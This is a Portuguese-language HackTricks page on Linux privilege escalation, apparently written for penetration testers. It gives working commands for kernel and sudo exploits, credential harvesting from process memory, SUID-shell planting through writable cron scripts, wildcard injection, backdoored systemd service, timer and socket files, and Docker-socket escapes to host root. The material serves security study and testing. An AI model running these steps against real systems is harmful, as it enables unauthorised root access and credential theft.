# Escalação de Privilégios no Linux

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informações do Sistema

### Informações do SO

Vamos começar adquirindo conhecimento sobre o sistema operacional em execução.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Caminho

Se você **tem permissões de escrita em qualquer pasta dentro da variável `PATH`**, pode ser capaz de sequestrar algumas bibliotecas ou binários:
```bash
echo $PATH
```
### Informações do ambiente

Alguma informação interessante, senhas ou chaves de API nas variáveis de ambiente?
```bash
(env || set) 2>/dev/null
```
### Exploits de Kernel

Verifique a versão do kernel e se há algum exploit que possa ser usado para escalar privilégios.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Você pode encontrar uma boa lista de kernel vulneráveis e alguns **exploits compilados** aqui: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) e [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Outros sites onde você pode encontrar alguns **exploits compilados**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Para extrair todas as versões de kernel vulneráveis ​​daquele site, você pode fazer:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Ferramentas que podem ajudar a procurar por exploits de kernel são:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute no alvo, verifica apenas exploits para o kernel 2.x)

Sempre **pesquise a versão do kernel no Google**, talvez sua versão do kernel esteja escrita em algum exploit de kernel e, assim, você terá certeza de que esse exploit é válido.

### CVE-2016-5195 (DirtyCow)

Elevação de privilégios do Linux - Kernel Linux <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Versão do Sudo

Com base nas versões vulneráveis do sudo que aparecem em:
```bash
searchsploit sudo
```
Você pode verificar se a versão do sudo é vulnerável usando este comando grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### sudo < v1.28

De @sickrov
```
sudo -u#-1 /bin/bash
```
### Falha na verificação de assinatura do Dmesg

Verifique a **caixa smasher2 do HTB** para um **exemplo** de como essa vulnerabilidade pode ser explorada.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Mais enumeração do sistema
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Enumerar possíveis defesas

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```
### Grsecurity

Grsecurity é um patch de segurança para o kernel do Linux que fornece recursos adicionais de segurança, como prevenção de exploração de buffer overflow, proteção de execução de pilha, restrições de execução de binários, entre outros. O Grsecurity também inclui um sistema de controle de acesso obrigatório (MAC) que pode ser usado para restringir o acesso de usuários e processos a recursos do sistema. O Grsecurity é uma ferramenta útil para endurecer a segurança do sistema e prevenir a escalada de privilégios. No entanto, a instalação do Grsecurity pode ser complicada e pode causar problemas de compatibilidade com outros patches e módulos do kernel.
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX

PaX é um patch de segurança para o kernel do Linux que implementa a execução de páginas somente leitura, a execução de pilha somente leitura e a aleatorização de endereço de espaço do usuário. Essas medidas de segurança ajudam a prevenir ataques de injeção de código e a exploração de vulnerabilidades de buffer overflow. O PaX é frequentemente usado em conjunto com o grsecurity para fornecer uma camada adicional de segurança para sistemas Linux.
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield

Execshield é uma técnica de proteção de memória que foi implementada no kernel do Linux para prevenir ataques de buffer overflow. Ele faz isso randomizando a localização da pilha, do heap e do código executável na memória, tornando mais difícil para um invasor explorar vulnerabilidades de buffer overflow. O Execshield é ativado por padrão em muitas distribuições Linux modernas.
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

O Security-Enhanced Linux (SElinux) é um mecanismo de segurança que fornece controle de acesso obrigatório (MAC) para o kernel do Linux. Ele é usado para restringir o acesso de processos e usuários a recursos do sistema, como arquivos, diretórios, portas de rede e sockets. O SElinux é uma camada adicional de segurança que pode ajudar a prevenir ataques de escalonamento de privilégios, pois limita o que os processos podem fazer, mesmo que eles tenham privilégios elevados. No entanto, o SElinux pode ser difícil de configurar e pode interferir em algumas operações do sistema, por isso é importante entender como ele funciona antes de ativá-lo.
```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR

ASLR (Address Space Layout Randomization) é uma técnica de segurança que randomiza a localização na memória dos segmentos de código, dados e pilha de um processo. Isso torna mais difícil para um atacante explorar vulnerabilidades de estouro de buffer e outros tipos de vulnerabilidades de corrupção de memória. O ASLR é ativado por padrão em muitos sistemas operacionais modernos, incluindo Linux e Windows. No entanto, existem técnicas de contorno para o ASLR, como a descoberta de endereços de bibliotecas compartilhadas e a exploração de vulnerabilidades de informações vazadas.
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Fuga do Docker

Se você estiver dentro de um contêiner Docker, poderá tentar escapar dele:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Discos

Verifique **o que está montado e desmontado**, onde e por quê. Se algo estiver desmontado, você pode tentar montá-lo e verificar informações privadas.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Software útil

Enumerar binários úteis
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Também, verifique se **há algum compilador instalado**. Isso é útil se você precisar usar algum exploit de kernel, pois é recomendado compilá-lo na máquina em que você vai usá-lo (ou em uma semelhante).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Software Vulnerável Instalado

Verifique a **versão dos pacotes e serviços instalados**. Talvez haja alguma versão antiga do Nagios (por exemplo) que possa ser explorada para a escalada de privilégios...\
Recomenda-se verificar manualmente a versão do software instalado mais suspeito.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Se você tem acesso SSH à máquina, também pode usar o **openVAS** para verificar se há software desatualizado e vulnerável instalado na máquina.

{% hint style="info" %}
Observe que esses comandos mostrarão muitas informações que serão principalmente inúteis, portanto, é recomendável usar aplicativos como OpenVAS ou similares que verificarão se alguma versão de software instalada é vulnerável a exploits conhecidos.
{% endhint %}

## Processos

Dê uma olhada em **quais processos** estão sendo executados e verifique se algum processo tem **mais privilégios do que deveria** (talvez um tomcat sendo executado por root?)
```bash
ps aux
ps -ef
top -n 1
```
Sempre verifique se há possíveis depuradores de [**electron/cef/chromium**] em execução, pois você pode abusar disso para escalar privilégios (abuso-de-depuradores-electron-cef-chromium.md). O **Linpeas** detecta isso verificando o parâmetro `--inspect` na linha de comando do processo.\
Também **verifique seus privilégios sobre os binários dos processos**, talvez você possa sobrescrever alguém.

### Monitoramento de processos

Você pode usar ferramentas como [**pspy**](https://github.com/DominicBreuker/pspy) para monitorar processos. Isso pode ser muito útil para identificar processos vulneráveis sendo executados com frequência ou quando um conjunto de requisitos é atendido.

### Memória do processo

Alguns serviços de um servidor salvam **credenciais em texto claro dentro da memória**.\
Normalmente, você precisará de **privilégios de root** para ler a memória de processos que pertencem a outros usuários, portanto, isso geralmente é mais útil quando você já é root e deseja descobrir mais credenciais.\
No entanto, lembre-se de que **como usuário regular, você pode ler a memória dos processos que possui**.

{% hint style="warning" %}
Observe que atualmente a maioria das máquinas **não permite ptrace por padrão**, o que significa que você não pode despejar outros processos que pertencem ao seu usuário não privilegiado.

O arquivo _**/proc/sys/kernel/yama/ptrace\_scope**_ controla a acessibilidade do ptrace:

* **kernel.yama.ptrace\_scope = 0**: todos os processos podem ser depurados, desde que tenham o mesmo uid. Esta é a maneira clássica de como o ptracing funcionava.
* **kernel.yama.ptrace\_scope = 1**: apenas um processo pai pode ser depurado.
* **kernel.yama.ptrace\_scope = 2**: Somente o administrador pode usar o ptrace, pois ele requer a capacidade CAP\_SYS\_PTRACE.
* **kernel.yama.ptrace\_scope = 3**: Nenhum processo pode ser rastreado com ptrace. Depois de definido, é necessário reiniciar para habilitar o ptracing novamente.
{% endhint %}

#### GDB

Se você tiver acesso à memória de um serviço FTP (por exemplo), poderá obter o Heap e procurar dentro dele suas credenciais.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Script GDB

{% code title="dump-memory.sh" %}
```
#!/bin/bash
# Usage: ./dump-memory.sh <pid> <address> <length> <output_file>

if [ $# -ne 4 ]; then
    echo "Usage: $0 <pid> <address> <length> <output_file>"
    exit 1
fi

# Attach to process and dump memory
gdb -q -n -ex "attach $1" -ex "dump memory $4 $2 $3" -ex "detach" -ex "quit" &> /dev/null

echo "Memory dumped to $4"
```
{% endcode %}

Este script é usado para despejar a memória de um processo em um arquivo. Ele usa o GDB para se conectar ao processo especificado pelo PID e, em seguida, despeja a memória do endereço especificado para o arquivo de saída especificado. O script recebe quatro argumentos: o PID do processo, o endereço de memória a ser despejado, o comprimento do despejo e o nome do arquivo de saída.
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps e /proc/$pid/mem

Para um determinado ID de processo, o arquivo **maps mostra como a memória é mapeada dentro do espaço de endereço virtual** desse processo; ele também mostra as **permissões de cada região mapeada**. O arquivo pseudo **mem expõe a própria memória dos processos**. A partir do arquivo **maps**, sabemos quais **regiões de memória são legíveis** e seus deslocamentos. Usamos essas informações para **procurar no arquivo mem e despejar todas as regiões legíveis** em um arquivo.
```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` fornece acesso à memória **física** do sistema, não à memória virtual. O espaço de endereço virtual do kernel pode ser acessado usando /dev/kmem.\
Normalmente, `/dev/mem` só pode ser lido pelo usuário **root** e pelo grupo **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump para Linux

O ProcDump é uma reinterpretação para Linux da clássica ferramenta ProcDump da suíte de ferramentas Sysinternals para Windows. Obtenha-o em [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714             

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Ferramentas

Para despejar a memória de um processo, você pode usar:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Você pode remover manualmente os requisitos de root e despejar o processo de propriedade sua
* Script A.5 de [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root é necessário)

### Credenciais da Memória do Processo

#### Exemplo Manual

Se você encontrar que o processo do autenticador está em execução:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Você pode despejar o processo (veja as seções anteriores para encontrar diferentes maneiras de despejar a memória de um processo) e procurar por credenciais dentro da memória:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

A ferramenta [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) irá **roubar credenciais de texto claro da memória** e de alguns **arquivos conhecidos**. É necessário ter privilégios de root para que funcione corretamente.

| Característica                                     | Nome do Processo      |
| -------------------------------------------------- | --------------------- |
| Senha do GDM (Kali Desktop, Debian Desktop)         | gdm-password          |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop)   | gnome-keyring-daemon  |
| LightDM (Ubuntu Desktop)                           | lightdm               |
| VSFTPd (Conexões FTP Ativas)                       | vsftpd                |
| Apache2 (Sessões HTTP Basic Auth Ativas)            | apache2               |
| OpenSSH (Sessões SSH Ativas - Uso do Sudo)          | sshd:                 |

#### Pesquisa Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Tarefas agendadas/Cron

Verifique se alguma tarefa agendada é vulnerável. Talvez você possa aproveitar um script sendo executado pelo root (vulnerabilidade de caractere curinga? pode modificar arquivos que o root usa? usar links simbólicos? criar arquivos específicos no diretório que o root usa?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Caminho do Cron

Por exemplo, dentro do arquivo _/etc/crontab_, você pode encontrar o PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Observe como o usuário "user" tem privilégios de escrita sobre /home/user_)

Se dentro deste crontab o usuário root tentar executar algum comando ou script sem definir o caminho. Por exemplo: _\* \* \* \* root overwrite.sh_\
Então, você pode obter um shell de root usando:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron usando um script com um caractere curinga (Injeção de Curinga)

Se um script é executado pelo root e possui um “**\***” dentro de um comando, você pode explorar isso para fazer coisas inesperadas (como escalonamento de privilégios). Exemplo:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Se o caractere curinga é precedido por um caminho como** _**/algum/caminho/\***_ **, ele não é vulnerável (mesmo** _**./\***_ **não é).**

Leia a seguinte página para mais truques de exploração de caracteres curinga:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Sobrescrevendo scripts do Cron e symlink

Se você **puder modificar um script do Cron** executado pelo root, você pode obter um shell muito facilmente:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Se o script executado pelo root usa um **diretório onde você tem acesso total**, talvez seja útil excluir essa pasta e **criar um link simbólico para outra pasta** que sirva um script controlado por você.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Trabalhos cron frequentes

Você pode monitorar os processos para procurar processos que estão sendo executados a cada 1, 2 ou 5 minutos. Talvez você possa aproveitar isso e escalar privilégios.

Por exemplo, para **monitorar a cada 0,1s durante 1 minuto**, **ordenar por comandos menos executados** e excluir os comandos que foram executados com mais frequência, você pode fazer:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Você também pode usar** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (isso irá monitorar e listar todos os processos que iniciam).

### Trabalhos cron invisíveis

É possível criar um trabalho cron **colocando um retorno de carro após um comentário** (sem caractere de nova linha), e o trabalho cron irá funcionar. Exemplo (observe o caractere de retorno de carro):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Serviços

### Arquivos _.service_ graváveis

Verifique se você pode escrever em algum arquivo `.service`, se puder, você **pode modificá-lo** para que ele **execute** sua **porta dos fundos quando** o serviço for **iniciado**, **reiniciado** ou **parado** (talvez você precise esperar até que a máquina seja reiniciada).\
Por exemplo, crie sua porta dos fundos dentro do arquivo .service com **`ExecStart=/tmp/script.sh`**

### Binários de serviço graváveis

Lembre-se de que se você tiver **permissões de gravação sobre binários sendo executados por serviços**, poderá alterá-los para portas dos fundos, para que, quando os serviços forem reexecutados, as portas dos fundos sejam executadas.

### PATH do systemd - Caminhos relativos

Você pode ver o PATH usado pelo **systemd** com:
```bash
systemctl show-environment
```
Se você descobrir que pode **escrever** em qualquer uma das pastas do caminho, pode ser capaz de **escalar privilégios**. Você precisa procurar por **caminhos relativos sendo usados em arquivos de configuração de serviços** como:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Em seguida, crie um **executável** com o **mesmo nome do caminho relativo binário** dentro da pasta PATH do systemd que você pode escrever e, quando o serviço for solicitado a executar a ação vulnerável (**Start**, **Stop**, **Reload**), sua **porta dos fundos será executada** (usuários não privilegiados geralmente não podem iniciar/parar serviços, mas verifique se você pode usar `sudo -l`).

**Saiba mais sobre serviços com `man systemd.service`.**

## **Temporizadores**

**Temporizadores** são arquivos de unidade do systemd cujo nome termina em `**.timer**` que controlam arquivos ou eventos `**.service**`. Os **temporizadores** podem ser usados como uma alternativa ao cron, pois possuem suporte integrado para eventos de tempo de calendário e eventos de tempo monotônico e podem ser executados de forma assíncrona.

Você pode enumerar todos os temporizadores com:
```bash
systemctl list-timers --all
```
### Timers com permissão de escrita

Se você pode modificar um timer, pode fazê-lo executar algum existente de systemd.unit (como um `.service` ou um `.target`)
```bash
Unit=backdoor.service
```
Na documentação, você pode ler o que é uma Unidade:

> A unidade a ser ativada quando este temporizador expirar. O argumento é um nome de unidade, cujo sufixo não é ".timer". Se não for especificado, esse valor será padrão para um serviço que tem o mesmo nome da unidade do temporizador, exceto pelo sufixo. (Veja acima.) É recomendável que o nome da unidade que é ativada e o nome da unidade do temporizador sejam nomeados de forma idêntica, exceto pelo sufixo.

Portanto, para abusar dessa permissão, você precisaria:

* Encontrar alguma unidade do systemd (como um `.service`) que esteja **executando um binário gravável**
* Encontrar alguma unidade do systemd que esteja **executando um caminho relativo** e você tenha **privilégios graváveis** sobre o **caminho do systemd** (para se passar por esse executável)

**Saiba mais sobre temporizadores com `man systemd.timer`.**

### **Habilitando o temporizador**

Para habilitar um temporizador, você precisa de privilégios de root e executar:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Observe que o **timer** é **ativado** criando um symlink para ele em `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Em resumo, um Unix Socket (tecnicamente, o nome correto é Unix Domain Socket, **UDS**) permite a **comunicação entre dois processos diferentes** na mesma máquina ou em máquinas diferentes em estruturas de aplicativos cliente-servidor. Para ser mais preciso, é uma maneira de se comunicar entre computadores usando um arquivo de descritores Unix padrão. (De [aqui](https://www.linux.com/news/what-socket/)).

Os sockets podem ser configurados usando arquivos `.socket`.

**Saiba mais sobre sockets com `man systemd.socket`.** Dentro deste arquivo, vários parâmetros interessantes podem ser configurados:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Essas opções são diferentes, mas um resumo é usado para **indicar onde ele vai ouvir** o socket (o caminho do arquivo de soquete AF\_UNIX, o número de porta IPv4/6 para ouvir, etc.)
* `Accept`: Aceita um argumento booleano. Se **verdadeiro**, uma **instância de serviço é iniciada para cada conexão recebida** e apenas o soquete de conexão é passado para ele. Se **falso**, todos os soquetes de escuta em si são **passados para a unidade de serviço iniciada**, e apenas uma unidade de serviço é iniciada para todas as conexões. Esse valor é ignorado para soquetes de datagrama e FIFOs, onde uma única unidade de serviço lida incondicionalmente com todo o tráfego de entrada. **O padrão é falso**. Por motivos de desempenho, é recomendável escrever novos daemons apenas de uma maneira adequada para `Accept=no`.
* `ExecStartPre`, `ExecStartPost`: Aceita uma ou mais linhas de comando, que são **executadas antes** ou **depois** dos **soquetes**/FIFOs de escuta serem **criados** e vinculados, respectivamente. O primeiro token da linha de comando deve ser um nome de arquivo absoluto, seguido de argumentos para o processo.
* `ExecStopPre`, `ExecStopPost`: Comandos adicionais que são **executados antes** ou **depois** dos **soquetes**/FIFOs de escuta serem **fechados** e removidos, respectivamente.
* `Service`: Especifica o nome da unidade de **serviço a ser ativada** no **tráfego de entrada**. Essa configuração só é permitida para soquetes com Accept=no. O padrão é o serviço que tem o mesmo nome que o soquete (com o sufixo substituído). Na maioria dos casos, não deve ser necessário usar essa opção.

### Arquivos .socket graváveis

Se você encontrar um arquivo `.socket` **gravável**, poderá **adicionar** no início da seção `[Socket]` algo como: `ExecStartPre=/home/kali/sys/backdoor` e a backdoor será executada antes que o soquete seja criado. Portanto, você **provavelmente precisará esperar até que a máquina seja reiniciada.**\
Observe que o sistema deve estar usando essa configuração de arquivo de soquete ou a backdoor não será executada.

### Sockets graváveis

Se você **identificar qualquer soquete gravável** (_agora estamos falando sobre Unix Sockets e não sobre os arquivos de configuração `.socket`_), então **você pode se comunicar** com esse soquete e talvez explorar uma vulnerabilidade.

### Enumerar Unix Sockets
```bash
netstat -a -p --unix
```
### Conexão bruta
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exemplo de exploração:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### Sockets HTTP

Observe que pode haver alguns **sockets ouvindo solicitações HTTP** (_não estou falando de arquivos .socket, mas de arquivos que atuam como sockets Unix_). Você pode verificar isso com:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Se o socket **responder com uma solicitação HTTP**, então você pode **comunicar** com ele e talvez **explorar alguma vulnerabilidade**.

### Socket Docker Gravável

O **socket docker** geralmente está localizado em `/var/run/docker.sock` e só pode ser gravado pelo usuário `root` e pelo grupo `docker`.\
Se por algum motivo **você tiver permissões de gravação** sobre esse socket, poderá escalar privilégios.\
Os seguintes comandos podem ser usados para escalar privilégios:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
#### Usar a API web do Docker a partir do socket sem o pacote Docker

Se você tem acesso ao **socket do Docker**, mas não pode usar o binário do Docker (talvez nem esteja instalado), você pode usar a API web diretamente com o `curl`.

Os seguintes comandos são um exemplo de como **criar um contêiner do Docker que monta a raiz** do sistema host e usar o `socat` para executar comandos no novo contêiner do Docker.
```bash
# List docker images
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
#[{"Containers":-1,"Created":1588544489,"Id":"sha256:<ImageID>",...}]
# Send JSON to docker API to create the container
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
#{"Id":"<NewContainerID>","Warnings":[]}
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```
O último passo é usar o `socat` para iniciar uma conexão com o contêiner, enviando uma solicitação de "anexar".
```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp

#HTTP/1.1 101 UPGRADED
#Content-Type: application/vnd.docker.raw-stream
#Connection: Upgrade
#Upgrade: tcp
```
Agora, você pode executar comandos no contêiner a partir desta conexão `socat`.

### Outros

Observe que se você tiver permissões de gravação sobre o soquete do docker porque está **dentro do grupo `docker`**, você tem [**mais maneiras de escalar privilégios**](interesting-groups-linux-pe/#docker-group). Se a [**API do docker estiver ouvindo em uma porta** você também pode ser capaz de comprometê-la](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Verifique **mais maneiras de sair do docker ou abusar dele para escalar privilégios** em:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Escalação de privilégios do **Containerd (ctr)**

Se você descobrir que pode usar o comando **`ctr`**, leia a seguinte página, pois **você pode ser capaz de abusar dele para escalar privilégios**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## Escalação de privilégios do **RunC**

Se você descobrir que pode usar o comando **`runc`**, leia a seguinte página, pois **você pode ser capaz de abusar dele para escalar privilégios**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-BUS é um **sistema de comunicação interprocessual (IPC)**, fornecendo um mecanismo simples, mas poderoso, **permitindo que aplicativos conversem entre si**, comuniquem informações e solicitem serviços. O D-BUS foi projetado do zero para atender às necessidades de um sistema Linux moderno.

